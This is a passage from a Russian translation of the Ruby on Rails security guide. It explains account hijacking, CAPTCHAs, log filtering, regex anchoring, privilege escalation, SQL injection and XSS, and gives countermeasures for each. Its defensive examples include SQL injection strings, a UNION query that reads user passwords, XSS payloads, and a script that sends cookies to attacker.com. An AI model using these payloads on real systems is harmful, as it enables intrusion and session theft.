злоумышленник может также получить контроль над аккаунтом, изменив адрес e-mail. После его изменения, он пойдет на страницу восстановления пароля и (возможно новый) пароль будет выслан на адрес e-mail злоумышленника. В качестве контрмеры <em>также требуйте от пользователя вводить пароль при изменении адреса e-mail</em>.</p><h5 id='drugoe' class='inside_page_header'><a href="#drugoe">6.2.3.</a> Другое</h5><p>В зависимости от вашего веб-приложения, могут быть другие способы угона аккаунт пользователя. Во многих случаях CSRF и XSS способствуют этому. Как пример, уязвимость CSRF в <a href="https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. В этой прототипной атаке жертва могла быть заманена на сайт злоумышленника. На этом сайте создавался тег IMG, который приводил к HTTP-запросу GET, который изменял настройки фильтра Google Mail. Если жертва была авторизована на Google Mail, злоумышленник мог изменить фильтры для перенаправления всех писем на его e-mail. Это почти так же вредно, как и полный угон аккаунта. Как контрмера, <em>пересмотрите логику своего приложения и устраните все уязвимости XSS и CSRF</em>.</p><h4 id='captcha' class='inside_page_header'><a href="#captcha">6.3.</a> CAPTCHA</h4><div class="info"><p><em>CAPTCHA - это тест вызова-отклика для определения, что отклик не сгенерирован компьютером. Она часто используется для защиты регистрационных форм от атакующих и форм комментирования от автоматических спам-ботов, требуя от пользователя написать буквы на искаженном изображении. Это положительная CAPTCHA, но есть еще и отрицательная CAPTCHA. Идея отрицательной CAPTCHA не просить пользователей доказать, что они люди, а показать, что робот является роботом.</em></p></div><p>Популярной CAPTCHA API является <a href="https://developers.google.com/recaptcha/">reCAPTCHA</a>, которая отображает два искаженных изображения слов из старых книг. Она также добавляет линию под углом, а не искаженный фон или высокий уровень деформации текста, как делали раньше CAPTCHA, так как они были сломаны. Дополнительно, использование reCAPTCHA помогает оцифровать старые книги. <a href="https://github.com/ambethia/recaptcha/">ReCAPTCHA</a> это также плагин Rails с тем же именем, как и API.</p><p>Вы получаете два ключа из API, открытый и секретный ключ, которые помещаете в свою среду Rails. После этого можете использовать метод <code>recaptcha_tags</code> во вью и метод <code>verify_recaptcha</code> в контроллере. <code>verify_recaptcha</code> возвратит false, если валидация провалится.
+Есть проблема с CAPTCHA, они оказывают негативное влияние на пользователя. Кроме того, некоторые слабовидящие пользователи найдут искаженные CAPTCHA неудобочитаемыми. Но все-таки, положительные CAPTCHA являются одним из лучших методов предотвращения отправки форм различными ботами.</p><p>Большинство ботов реально простенькие. Они ползают по вебу и кладут свой спам в каждое поле формы, какое только находят. Отрицательная CAPTCHA берет преимущество в этом и включает поле &quot;соблазна&quot; в форму, которое скрыто от человека с помощью CSS или JavaScript.</p><p>Обратите внимание, что отрицательные CAPTCHA эффективны только против простеньких ботов, и этого будет недостаточно для защиты критически важных приложений от нацеленных ботов. И все-таки, отрицательные и положительные CAPTCHA могут быть объединены для улучшения производительности, например, если поле &quot;соблазна&quot; не пустое (обнаружен бот), вам не нужно будет проверять положительные CAPTCHA, которые требуют HTTPS-запрос к сервису Google ReCaptcha перед вычислением отклика.</p><p>Вот несколько идей, как спрятать поля соблазна с помощью JavaScript и/или CSS:</p><ul><li>расположить поля за пределами видимой области страницы
+</li><li>сделать элементы очень маленькими или цветом таким же, как фон страницы
+</li><li>оставить поля отображаемыми, но сказать людям оставить их пустыми
+</li></ul><p>Наиболее простой отрицательной CAPTCHA является одно скрытое поле соблазна. На серверной стороне проверяется значение поля: если оно содержит текст, значит это бот. Затем можно или игнорировать сообщение, или вернуть положительный результат, но не сохранять сообщение в базу данных. Это, возможно, удовлетворит бота и он пойдет дальше.</p><p>Более сложные отрицательные CAPTCHA рассмотрены в <a href="https://nedbatchelder.com/text/stopbots.html">блоге Ned Batchelder</a>:</p><ul><li>Включить поле с текущей временной меткой UTC в нем и проверить его на сервере. Если оно слишком близко в прошлом, форма невалидна.
+</li><li>Рандомизировать имена полей
+</li><li>Включить более одного поля соблазна всех типов, включая кнопки подтверждения
+</li></ul><p>Отметьте, что это защитит только от автоматических ботов, специально изготовленные боты не могут быть этим остановлены. Поэтому <em>отрицательная CAPTCHA не может хорошо защитить формы входа</em>.</p><h4 id='logirovanie' class='inside_page_header'><a href="#logirovanie">6.4.</a> Логирование</h4><div class="warning"><p><em>Скажите Rails не помещать пароли в файлы логов.</em></p></div><p>По умолчанию Rails логирует все запросы, сделанные к веб-приложению. Но файлы логов могут быть большим вопросом безопасности, поскольку они могут содержать учетные данные для входа, номера кредитных карт и так далее. При разработке концепции безопасности веб-приложения также необходимо думать о том, что случится, если злоумышленник получит (полный) доступ к веб-серверу. Шифрование секретов и паролей будут совершенно бесполезным, если файлы лога отображают их чистым текстом. Можете <em>фильтровать некоторые параметры запроса в ваших файлах лога</em>, присоединив их к <a href="/configuring#config-filter-parameters"><code>config.filter_parameters</code></a> в конфигурации приложения. Эти параметры будут помечены [FILTERED] в логе.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">filter_parameters</span> <span class="o">&lt;&lt;</span> <span class="ss">:password</span>
+</code></pre>
+</div>
+<div class="note"><p>Предоставленные параметры будут отфильтрованы по частичному соответствию регулярному выражению. Rails добавляет список фильтров по умолчанию, включая <code>:passw</code>, <code>:secret</code> и <code>:token</code> в соответствующий инициализатор (<code>initializers/filter_parameter_logging.rb</code>) чтобы обрабатывать обычные параметры приложения, такие как <code>password</code>, <code>password_confirmation</code> и <code>my_token</code>.</p></div><h4 id='regulyarnye-vyrazheniya' class='inside_page_header'><a href="#regulyarnye-vyrazheniya">6.5.</a> Регулярные выражения</h4><div class="info"><p><em>Распространенная ошибка в регулярных выражениях Ruby в том, что проверяется соответствие начала и конца строки с помощью ^ и $, вместо \A и \z.</em></p></div><p>Ruby использует немного отличающийся от многих языков программирования подход в соответствии концу и началу строки. Поэтому даже много литературы по Ruby и Rails допускают такую ошибку. Так как же это влияет на безопасность? Скажем, вы хотите по-быстрому проверить поле URL и используете подобное простое регулярное выражение:</p><div class="code_container">
+  <pre><code class="highlight ruby">  <span class="sr">/^https?:\/\/[^\n]`$/i</span>
+</code></pre>
+</div>
+<p>В некоторых языках это сработает хорошо. Однако, <em>в Ruby <code>^</code> и <code>$</code> соответствуют началу и концу <em>строчки</em></em>. И, таким образом, следующий URL пройдет фильтр без проблем:</p><div class="code_container">
+  <pre><code class="highlight plaintext">javascript:exploit_code();/*
+http://hi.com
+*/
+</code></pre>
+</div>
+<p>Этот URL пройдет фильтр, поскольку он соответствует регулярному выражению – вторая строчка, остальное не имеет значения. Теперь представим, что у нас во вью этот URL выводится следующим образом:</p><div class="code_container">
+  <pre><code class="highlight ruby">  <span class="n">link_to</span> <span class="s2">"Homepage"</span><span class="p">,</span> <span class="vi">@user</span><span class="p">.</span><span class="nf">homepage</span>
+</code></pre>
+</div>
+<p>Для посетителя ссылка выглядит невинно, но при ее нажатии, она выполнит JavaScript функцию &quot;exploit_code&quot; или любой другой представленный злоумышленником скрипт.</p><p>Для починки регулярного выражения должны использоваться <code>\A</code> и <code>\z</code> вместо <code>^</code> и <code>$</code>, следующим образом:</p><div class="code_container">
+  <pre><code class="highlight ruby">  <span class="sr">/\Ahttps?:\/\/[^\n]+\z/i</span>
+</code></pre>
+</div>
+<p>Поскольку это частая ошибка, теперь валидатор формата (validates_format_of) вызывает исключение, если представленное регулярное выражение начинается с ^ или заканчивается на $. Если вам необходимо использовать ^ и $ вместо \A и \z (что является редкостью), можно установить опцию <code>:multiline</code> в <code>true</code>, следующим образом:</p><div class="code_container">
+  <pre><code class="highlight ruby">  <span class="c1"># содержимое должно содержать строчку "Meanwhile" где-то в строке</span>
+  <span class="n">validates</span> <span class="ss">:content</span><span class="p">,</span> <span class="ss">format: </span><span class="p">{</span> <span class="ss">with: </span><span class="sr">/^Meanwhile$/</span><span class="p">,</span> <span class="ss">multiline: </span><span class="kp">true</span> <span class="p">}</span>
+</code></pre>
+</div>
+<p>Отметьте, что это защищает вас только против наиболее распространенной ошибки при использовании валидатора формата - нужно всегда держать в уме, что ^ и $ соответствуют началу и концу <strong>строчки</strong> в Ruby, а не началу и концу строки.</p><h4 id='rasshirenie-privilegiy' class='inside_page_header'><a href="#rasshirenie-privilegiy">6.6.</a> Расширение привилегий</h4><div class="warning"><p><em>Изменение единственного параметра может дать пользователю неавторизованный доступ. Помните, что каждый параметр может быть изменен, независимо от того, как вы спрятали или завуалировали его.</em></p></div><p>Наиболее общий параметр, в который может вмешиваться пользователь, это параметр id, как в <code>http://www.domain.com/project/1</code>, где 1 это id. Он будет доступен в <code>params</code> в контроллере. Там вы скорее всего сделаете что-то подобное:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="vi">@project</span> <span class="o">=</span> <span class="no">Project</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">])</span>
+</code></pre>
+</div>
+<p>Это нормально для большинства приложений, но безусловно нет, если пользователь не авторизован для просмотра всех проектов. Если пользователь изменяет id на 42, и ему не позволено видеть эту информацию, он в любом случае получит к ней доступ. Вместо этого, <em>также запрашивайте права доступа пользователя</em>:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="vi">@project</span> <span class="o">=</span> <span class="vi">@current_user</span><span class="p">.</span><span class="nf">projects</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:id</span><span class="p">])</span>
+</code></pre>
+</div>
+<p>В зависимости от вашего веб-приложения, может быть много параметров, в которые может вмешиваться пользователь. Как правило, <em>не вводимые пользователем данные безопасны, пока не доказано обратное, и каждый параметр от пользователя потенциально подтасован</em>.</p><p>Не заблуждайтесь о безопасности при обфускации и безопасности JavaScript. Инструменты разработчика позволяют вам предварительно смотреть и изменять все скрытые поля формы. <em>JavaScript может использоваться для проверки пользовательских данных, но только не для предотвращения злоумышленников от отсылки злонамеренных запросов с неожидаемыми значениями</em>. Плагин Firebug для Mozilla Firefox логирует каждый запрос и может повторить и изменить его. Это простой способ обойти любые валидации JavaScript. А еще есть даже прокси на стороне клиента, которые позволяют перехватывать любой запрос и отклик из Интернет.</p><h3 id='in-ektsii' class='inside_page_header'><a href="#in-ektsii">7.</a> Инъекции</h3><div class="info"><p><em>Инъекции - это класс атак, внедряющий злонамеренный код или параметры в веб-приложение для запуска их вне контекста безопасности. Известными примерами инъекций являются межсайтовый скриптинг (XSS) и SQL-инъекции.</em></p></div><p>Инъекции очень запутанные, поскольку тот же код или параметр может быть злонамеренным в одном контексте, но абсолютно безвредным в другом. Контекстом может быть сценарий, запрос или язык программирования, оболочка или метод Ruby/Rails. Следующие разделы раскроют все важные контексты, где могут произойти атаки в форме инъекций. Первый раздел, однако, раскроет архитектурное решение в связи с инъекцией.</p><h4 id='spiski-razresheniy-protiv-spiskov-ogranicheniy' class='inside_page_header'><a href="#spiski-razresheniy-protiv-spiskov-ogranicheniy">7.1.</a> Списки разрешений против списков ограничений</h4><div class="note"><p><em>При экранировании, защите или верификации чего-либо, предпочитайте списки разрешений, а не списки ограничений.</em></p></div><p>Список ограничений может быть перечнем плохих адресов e-mail, непубличных действий или плохих тегов HTML. Этому противопоставляется список разрешений хороших адресов e-mail, публичных действий, хороших тегов HTML и так далее. Хотя иногда невозможно создать список разрешений (в фильтре спама, например), <em>предпочтительнее использовать подходы списка разрешений</em>:</p><ul><li>Используйте <code>before_action except: [...]</code> вместо <code>only: [...]</code> для экшнов, связанных с безопасностью. Таким образом, вы не забудете включить проверки безопасности для вновь добавляемых экшнов.
+</li><li>Разрешите <code>&lt;strong&gt;</code> вместо удаления <code>&lt;script&gt;</code> против межсайтового скриптинга (XSS). Подробнее об этом ниже.
+</li><li>Не пытайтесь править пользовательские данные с помощью списков ограничений:
+<ul><li>Это позволит сработать атаке: <code>&quot;&lt;sc&lt;script&gt;ript&gt;&quot;.gsub(&quot;&lt;script&gt;&quot;, &quot;&quot;)</code>
+</li><li>Но отвергнет неправильный ввод
+</li></ul></li></ul><p>Списки разрешений также хороший подход против человеческого фактора в забывании чего-либо в списке ограничений.</p><h4 id='sql-in-ektsii' class='inside_page_header'><a href="#sql-in-ektsii">7.2.</a> SQL-инъекции</h4><div class="info"><p><em>Благодаря умным методам, это вряд ли является проблемой в большинстве приложений на Rails. Однако, это очень разрушительная и обычная атака на веб-приложения, поэтому важно понять проблему.</em></p></div><h5 id='vvedenie2' class='inside_page_header'><a href="#vvedenie2">7.2.1.</a> Введение</h5><p>Цель атаки в форме SQL-инъекции - сделать запросы к базе данных, манипулируя с параметрами приложения. Популярная цель атак в форме SQL-инъекций - обойти авторизацию. Другой целью является осуществление манипуляции с данными или чтение определенных данных. Вот пример, как не следует использовать пользовательские данные в запросе:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Project</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"name = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
+</code></pre>
+</div>
+<p>Это может быть экшн поиска и пользователь может ввести имя проекта, который он хочет найти. Если злонамеренный пользователь введет <code>&#39; OR 1) --</code>, результирующим SQL-запросом будет:</p><div class="code_container">
+  <pre><code class="highlight sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">projects</span> <span class="k">WHERE</span> <span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">--')</span>
+</code></pre>
+</div>
+<p>Два тире начинают комментарий, игнорирующий все после него. Таким образом, запрос вернет все записи из таблицы <code>projects</code>, включая те, которые недоступны пользователю. Так случилось, поскольку условие истинно для всех записей.</p><h5 id='obhod-avtorizatsii' class='inside_page_header'><a href="#obhod-avtorizatsii">7.2.2.</a> Обход авторизации</h5><p>Обычно веб-приложения включают контроль доступа. Пользователь вводит свои учетные данные для входа, веб-приложение пытается найти соответствующую запись в таблице пользователей. Приложение предоставляет доступ, когда находит запись. Однако, злоумышленник возможно сможет обойти эту проверку с помощью SQL-инъекции. Следующее показывает типичный запрос к базе данных в Rails для поиска первой записи в таблице <code>users</code>, которая соответствует параметрам учетных данных для входа, предоставленных пользователем.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">User</span><span class="p">.</span><span class="nf">find_by</span><span class="p">(</span><span class="s2">"login = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">' AND password = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:password</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
+</code></pre>
+</div>
+<p>Если злоумышленник введет <code>&#39; OR &#39;1&#39;=&#39;1</code> как имя и <code>&#39; OR &#39;2&#39;&gt;&#39;1</code> как пароль, результирующий запрос SQL будет:</p><div class="code_container">
+  <pre><code class="highlight sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">login</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="s1">'2'</span><span class="o">&gt;</span><span class="s1">'1'</span> <span class="k">LIMIT</span> <span class="mi">1</span>
+</code></pre>
+</div>
+<p>Это просто найдет первую запись в базе данных и предоставит доступ этому пользователю.</p><h5 id='neavtorizovannoe-chtenie' class='inside_page_header'><a href="#neavtorizovannoe-chtenie">7.2.3.</a> Неавторизованное чтение</h5><p>Выражение UNION соединяет два запроса SQL и возвращает данные одним набором. Злоумышленник может использовать это, чтобы прочитать произвольную информацию из базы данных. Давайте рассмотрим вышеописанный пример:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Project</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"name = '</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
+</code></pre>
+</div>
+<p>Теперь позволим внедрить другой запрос, использующий выражение UNION:</p><div class="code_container">
+  <pre><code class="highlight plaintext">') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
+</code></pre>
+</div>
+<p>Это приведет к следующему запросу SQL:</p><div class="code_container">
+  <pre><code class="highlight sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">projects</span> <span class="k">WHERE</span> <span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="k">UNION</span>
+  <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span><span class="n">login</span> <span class="k">AS</span> <span class="n">name</span><span class="p">,</span><span class="n">password</span> <span class="k">AS</span> <span class="n">description</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">FROM</span> <span class="n">users</span> <span class="c1">--'</span>
+</code></pre>
+</div>
+<p>Результатом будет не список проектов (поскольку нет проектов с пустым именем), а список имен пользователя и их пароли. Поэтому надеемся, что вы <a href="#user-management">безопасно хэшируете пароли</a> в базе данных! Единственной проблемой для злоумышленника может быть то, что число столбцов должно быть равное в обоих запросах. Вот почему второй запрос включает список единичек (1), который всегда будет иметь значение 1, чтобы количество столбцов соответствовало первому запросу.</p><p>Также второй запрос переименовывает некоторые столбцы выражением AS, чтобы веб-приложение отображало значения из таблицы <code>users</code>. Убедитесь, что обновили свой Rails <a href="https://rorsecurity.info/journal/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter.html">как минимум до 2.1.1</a>.</p><h5 id='kontrmery' class='inside_page_header'><a href="#kontrmery">7.2.4.</a> Контрмеры</h5><p>В Ruby on Rails есть встроенный фильтр для специальных символов SQL, который экранирует <code>&#39;</code>, <code>&quot;</code>, символ NULL и разрыв строчки. <em>Использование <code>Model.find(id)</code> или <code>Model.find_by_something(something)</code> автоматически применяет эту контрмеру</em>. Но в фрагментах SQL, особенно <em>в фрагментах условий (<code>where(&quot;...&quot;)</code>), методах <code>connection.execute()</code> или <code>Model.find_by_sql()</code>, это должно быть применено вручную</em>.</p><p>Вместо передачи строки, можете использовать позиционные обработчики, чтобы экранировать испорченные строки, подобно следующему:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"zip_code = ? AND quantity &gt;= ?"</span><span class="p">,</span> <span class="n">entered_zip_code</span><span class="p">,</span> <span class="n">entered_quantity</span><span class="p">).</span><span class="nf">first</span>
+</code></pre>
+</div>
+<p>Первый параметр это фрагмент SQL с вопросительными знаками. Второй и третий аргумент заменят вопросительные знаки значениями переменных.</p><p>также можно использовать именованные обработчики, значения будут взяты из используемого хэша:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">values</span> <span class="o">=</span> <span class="p">{</span> <span class="ss">zip: </span><span class="n">entered_zip_code</span><span class="p">,</span> <span class="ss">qty: </span><span class="n">entered_quantity</span> <span class="p">}</span>
+<span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="s2">"zip_code = :zip AND quantity &gt;= :qty"</span><span class="p">,</span> <span class="n">values</span><span class="p">).</span><span class="nf">first</span>
+</code></pre>
+</div>
+<p>Помимо этого, можно разделять и соединять условия, валидные для вашего случая:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Model</span><span class="p">.</span><span class="nf">where</span><span class="p">(</span><span class="ss">zip_code: </span><span class="n">entered_zip_code</span><span class="p">).</span><span class="nf">where</span><span class="p">(</span><span class="s2">"quantity &gt;= ?"</span><span class="p">,</span> <span class="n">entered_quantity</span><span class="p">).</span><span class="nf">first</span>
+</code></pre>
+</div>
+<p>Отметьте, что ранее упомянутые контрмеры доступны только в экземплярах модели. В других местах используйте <a href="https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql"><code>sanitize_sql</code></a>. <em>Введите в привычку думать о последствиях безопасности, когда используете внешние строки в SQL</em>.</p><h4 id='cross-site-scripting-xss' class='inside_page_header'><a href="#cross-site-scripting-xss">7.3.</a>  Межсайтовый скриптинг (XSS)</h4><div class="info"><p><em>Наиболее распространенная и одна из наиболее разрушительных уязвимостей в веб-приложениях - это XSS. Данная вредоносная атака внедряет на стороне клиента исполняемый код. Rails предоставляет методы для защиты от этих атак.</em></p></div><h5 id='tochki-vhoda' class='inside_page_header'><a href="#tochki-vhoda">7.3.1.</a> Точки входа</h5><p>Точка входа - это уязвимый URL и его параметры, с которых злоумышленник может начать атаку.</p><p>Наиболее распространенными точками входа являются публикации сообщений, комментарии пользователей и гостевые книги, но заголовки проектов, имена документов и страницы результата поиска также бывают уязвимы - почти везде, где пользователь может ввести данные. Но ввод не обязательно может прийти из полей ввода на веб-сайтах, это может быть любой параметр URL – очевидный, скрытый или внутренний. Помните, что пользователь может перехватить любой трафик. Приложения или клиентские прокси могут легко изменить запросы. Также имеются иные направления атак, такие как баннерная реклама.</p><p>Атаки XSS работают подобным образом: злоумышленник встраивает некоторый код, веб-приложение сохраняет его и отображает на странице, после чего представляет его жертве. Большинство примеров XSS просто отображают сообщение, но реальные возможности гораздо мощнее. XSS может своровать куки, угнать сессию, перенаправить жертву на фальшивый веб-сайт, отобразить рекламу, полезную злоумышленнику, изменить элементы на веб-странице, чтобы получить конфиденциальную информацию или установить вредоносное программное обеспечение, используя дыры в веб-браузере.</p><p>Во второй половине 2007 года выявлено 88 уязвимостей в браузерах Mozilla, 22 в Safari, 18 в IE и 12 в Opera. Отчет об угрозах Symantec Global Internet Security также задокументировал 239 уязвимостей плагинов для браузеров в последние шесть месяцев 2007 года. <a href="https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/">Mpack</a> очень активный и регулярно обновляемый фреймворк злоумышленников, который использует эти уязвимости. Для преступных хакеров очень привлекательно использовать уязвимость к SQL-инъекциям в фреймворке веб-приложения и вставлять вредоносный код в каждый текстовый столбец таблицы. В апреле 2008 года более 510,000 сайтов были взломаны подобным образом, в том числе Британского правительства, ООН и многих других высокопоставленных организаций.</p><h5 id='html-javascript-in-ektsii' class='inside_page_header'><a href="#html-javascript-in-ektsii">7.3.2.</a> HTML/JavaScript инъекции</h5><p>Наиболее распространенным языком для XSS является, конечно, наиболее популярный клиентский скриптовый язык JavaScript, часто в сочетании с HTML. <em>Экранирование пользовательского ввода необходимо</em>.</p><p>Вот самый простой тест для проверки на XSS:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre>
+</div>
+<p>Этот код JavaScript просто отображает сообщение. Следующие примеры делают примерно то же самое, но в очень необычных местах:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"javascript:alert('Hello')"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;table</span> <span class="na">background=</span><span class="s">"javascript:alert('Hello')"</span><span class="nt">&gt;</span>
+</code></pre>
+</div>
+<h6 id='pohischenie-kuki' class='inside_page_header'><a href="#pohischenie-kuki">7.3.2.1.</a> Похищение куки</h6><p>Пока эти примеры не делали никакого вреда, поэтому давайте посмотрим, как злоумышленник может похитить куки пользователя (и, таким образом, угнать пользовательскую сессию). В JavaScript можно использовать свойство <code>document.cookie</code> для чтения и записи куки документа. JavaScript обеспечивает политику ограничения домена, которая означает, что скрипт с одного домена не может получить доступ к куки другого домена. Свойство <code>document.cookie</code> содержит куки создавшего веб-сервера. Однако это свойство можно прочитать и записать, если внедрите код непосредственно в документ HTML (как это происходит в XSS). Введите это где-нибудь в своем веб-приложении, чтобы увидеть собственные куки на результирующей странице:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre>
+</div>
+<p>Для злоумышленника, разумеется, бесполезно, что жертва видит свои куки. Следующий пример пытается загрузить изображение с URL <a href="http://www.attacker.com/">http://www.attacker.com/</a> плюс куки. Конечно, этот URL не существует, поэтому браузер ничего не отобразит. Но злоумышленник сможет просмотреть логи доступа к своему веб-серверу, чтобы увидеть куки жертв.</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://www.attacker.com/</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre>
+</div>
+<p>Лог файлы на <code>www.attacker.com</code> будут подобны следующему:</p><div class="code_container">
+  <pre><code class="highlight plaintext">GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+</code></pre>
+</div>
+<p>Можно смягчить эти атаки (очевидным способом) добавив к куки флаг <strong>httpOnly</strong>, таким образом, <code>document.cookie</code> не сможет быть прочитан JavaScript. HTTP-only куки могут использоваться начиная с IE v6.SP1, Firefox v2.0.0.5 и Opera 9.5, Safari 4 и Chrome 1.0.154 и выше. Но другие, более старые браузеры (такие как WebTV и IE 5.5 on Mac) могут фактически отказаться загружать страницу. Однако, будьте осторожны, что куки <a href="https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly">все еще видны при использовании Ajax</a>.</p><h6 id='iskazhenie' class='inside_page_header'><a href="#iskazhenie">7.3.2.2.</a> Искажение</h6><p>Исказив веб-страницу, злоумышленник сможет сделать многое, например, предоставить ложную информацию или завлечь жертву на сайт злоумышленника, чтобы украсть куки, учетные данные для входа или другие чувствительные данные. Наиболее популярным способом является включение кода с внешних источников с помощью iframe:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">”StatPage”</span> <span class="na">src=</span><span class="s">"http://58.xx.xxx.xxx"</span> <span class="na">width=</span><span class="s">5</span> <span class="na">height=</span><span class="s">5</span> <span class="na">style=</span><span class="s">”display:none”</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre>
+</div>
+<p>Это загрузит произвольный HTML и/или JavaScript с внешнего источника и внедрит его, как часть сайта. Этот <code>iframe</code> взят из настоящей атаки на правительственные итальянские сайты с использованием <a href="https://isc.sans.org/diary.html?storyid=3015">Mpack attack framework</a>. Mpack пытается установить злонамеренное программное обеспечение через дыры безопасности в веб-браузере – очень успешно, 50% атак успешны.</p><p>Более специализированные атаки могут накрывать целые веб-сайты или отображать форму входа, которая выглядит как такая же на оригинальном сайте, но передает имя пользователя и пароль на сайт злоумышленников. Или могут использовать CSS и/или JavaScript, чтобы спрятать настоящую ссылку в веб-приложении, и отобразить на ее месте другую, которая перенаправит на фальшивый веб-сайт.</p><p>Атаки в форме искажающих инъекций являются такими, что полезная нагрузка не хранится, а предоставляется жертве позже, но включена в URL. Особенно в формах поиска не получается экранировать строку поиска. Следующая ссылка представляет страницу, озаглавленную &quot;George Bush appointed a 9 year old boy to be the chairperson...&quot;:</p><div class="code_container">
+  <pre><code class="highlight plaintext">http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
+  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
+</code></pre>
+</div>
+<h6 id='kontrmery2' class='inside_page_header'><a href="#kontrmery2">7.3.2.3.</a> Контрмеры</h6><p><em>Очень важно отфильтровывать злонамеренный ввод, но также важно экранировать вывод в веб-приложении</em>.</p><p>Особенно для XSS, важно делать <em>фильтрацию ввода с помощью списка разрешений, а не ограничений</em>. Фильтрация списком разрешений устанавливает допустимые значения, остальные значения недопустимы. Списки ограничений всегда не законченные.</p><p>Предположим, список ограничений удаляет &quot;script&quot; из пользовательского ввода. Теперь злоумышленник встраивает <code>&quot;&lt;scrscriptipt&gt;&quot;</code>, и после фильтра остается <code>&quot;&lt;script&gt;&quot;</code>. Ранние версии Rails использовали подход списка ограничений для методов strip_tags(), strip_links() и sanitize(). Поэтому такой сорт инъекций был возможен:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">strip_tags</span><span class="p">(</span><span class="s2">"some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;"</span><span class="p">)</span>
+</code></pre>
+</div>
+<p>Это возвратит <code>&quot;some&lt;script&gt;alert(&#39;hello&#39;)&lt;/script&gt;&quot;</code>, что позволит осуществиться атаке. Вот почему подход списка разрешений лучше при использовании метода Rails 2 sanitize():</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">tags</span> <span class="o">=</span> <span class="sx">%w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="ss">tags: </span><span class="n">tags</span><span class="p">,</span> <span class="ss">attributes: </span><span class="sx">%w(href title)</span><span class="p">)</span>
+</code></pre>
+</div>
